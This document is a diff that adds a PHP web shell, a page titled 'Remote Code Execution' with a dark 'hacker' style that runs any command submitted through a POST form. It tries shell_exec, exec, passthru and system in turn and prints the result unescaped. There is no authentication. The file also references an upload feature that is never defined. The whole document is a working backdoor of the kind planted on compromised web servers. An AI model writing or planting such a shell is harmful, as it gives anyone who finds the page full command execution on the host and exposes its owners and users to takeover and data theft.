@@ -1,0 +1,104 @@
+<?php
+
+function execute_command($command) {
+    
+  $output = '';
+
+    if (function_exists('shell_exec')) {
+        $output = shell_exec($command);
+    } elseif (function_exists('exec')) {
+        exec($command, $output);
+        $output = implode("\n", $output);
+    } elseif (function_exists('passthru')) {
+        ob_start();
+        passthru($command);
+        $output = ob_get_clean();
+    } elseif (function_exists('system')) {
+        ob_start();
+        system($command);
+        $output = ob_get_clean();
+    } else {
+        $output = 'No command execution function available.';
+    }
+
+    return "<pre>$output</pre>";   
+
+}
+$command_output = '';
+
+// Example usage
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_POST['command'])) {
+        $command_output = execute_command($_POST['command']);
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Remote Code Execution</title>
+    <style>
+        body {
+            font-family: 'Courier New', Courier, monospace;
+            background-color: #0d0d0d;
+            color: #ffffff;
+            margin: 50px;
+        }
+        h2 {
+            color: #00ff00;
+        }
+        .command-box, .upload-box {
+            margin-bottom: 20px;
+        }
+        .output-box {
+            background-color: #1a1a1a;
+            padding: 10px;
+            border: 2px solid #00ff00;
+            color: #00ff00;
+            font-family: 'Courier New', Courier, monospace;
+            box-shadow: 0 0 10px #00ff00;
+            margin-top: 10px;
+        }
+        input[type="text"], input[type="file"], button {
+            background-color: #333333;
+            color: #00ff00;
+            border: 1px solid #00ff00;
+            padding: 5px;
+            margin: 5px 0;
+        }
+        button {
+            cursor: pointer;
+        }
+        input[type="text"]::placeholder {
+            color: #00ff00;
+        }
+    </style>
+</head>
+<body>
+
+<div class="command-box">
+    <h2>Execute Command</h2>
+    <form method="post">
+        <input type="text" name="command" placeholder="Enter command" style="width: 300px;">
+        <button type="submit">Execute</button>
+    </form>
+</div>
+
+<?php if ($command_output): ?>
+    <div class="output-box">
+        <?php echo $command_output; ?>
+    </div>
+<?php endif; ?>
+
+
+<?php if ($upload_message): ?>
+    <div class="output-box">
+        <h3>Upload Status</h3>
+        <?php echo $upload_message; ?>
+    </div>
+<?php endif; ?>
+
+</body>
+</html>
